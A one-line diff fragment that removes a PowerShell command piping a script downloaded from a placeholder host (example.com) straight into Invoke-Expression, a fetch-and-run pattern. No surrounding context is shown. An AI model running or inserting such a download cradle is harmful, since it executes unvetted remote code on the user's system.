@@ -1,1 +1,0 @@
-iex (iwr -Uri 'http://example.com/script.ps1' -UseBasicParsing)
